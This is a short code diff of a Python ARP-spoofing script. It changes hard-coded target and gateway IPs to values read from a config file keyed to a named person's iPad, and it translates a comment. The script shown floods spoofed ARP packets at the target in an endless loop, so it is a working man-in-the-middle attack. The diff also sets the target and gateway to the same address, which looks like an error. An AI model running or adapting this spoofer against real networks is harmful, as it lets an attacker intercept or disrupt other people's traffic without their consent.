@@ -37,12 +37,14 @@ def stop(signal,frame):
 
 if __name__ == '__main__':
     ## Get basic ip address from config.yaml
-    TargetIp = "192.168.41.208"
-    GateWayAddr = "192.168.41.205"
+    f = open('../config.yaml')
+    config = yaml.load(f)
+    TargetIp = config["Jiahe's iPad"]["IP"]
+    GateWayAddr = config["Jiahe's iPad"]["IP"]
     ## When the connection get interupted, exit the script
     signal.signal(signal.SIGINT, stop)
     ## Build Ether packet
     packet = build_packet(TargetIp, GateWayAddr)
     ## ARP spoof: keep sending packets
     while True:
-        sendp(packet, inter=2, iface="wlp1s0") #inter表示发送包的间隔,iface表示我们的网卡
+        sendp(packet, inter=2, iface="wlp1s0")  #inter: interval between two attacks(s)
